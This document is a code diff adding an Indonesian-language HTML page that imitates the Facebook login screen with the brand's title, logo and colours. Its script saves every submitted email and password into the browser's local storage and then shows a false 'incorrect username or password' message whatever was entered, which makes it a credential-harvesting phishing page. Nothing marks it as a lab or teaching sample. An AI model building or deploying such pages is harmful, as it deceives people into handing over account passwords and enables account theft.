@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to right, #f7f7f7, #e3f2fd);
+        }
+        .login-container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .forgot-password, .new-account {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .new-account {
+            background: #42b72a;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            display: inline-block;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">f</div>
+        <input type="text" placeholder="Nomor ponsel atau email" id="email">
+        <input type="password" placeholder="Kata sandi" id="password">
+        <button class="login-button" onclick="login()">Login</button>
+        <a href="#" class="forgot-password">Lupa kata sandi?</a>
+        <a href="#" class="new-account">Buat akun baru</a>
+        <div class="error-message" id="error-message"></div>
+    </div>
+    
+    <script>
+        function login() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            let errorMessage = document.getElementById("error-message");
+
+            if (email && password) {
+                // Simpan data login ke Local Storage
+                let logins = JSON.parse(localStorage.getItem('logins')) || [];
+                logins.push({ email: email, password: password });
+                localStorage.setItem('logins', JSON.stringify(logins));
+
+                // Tampilkan pesan kesalahan
+                errorMessage.textContent = "Username atau password yang Anda masukkan salah";
+            } else {
+                errorMessage.textContent = "Silakan isi email dan kata sandi";
+            }
+        }
+    </script>
+</body>
+</html>
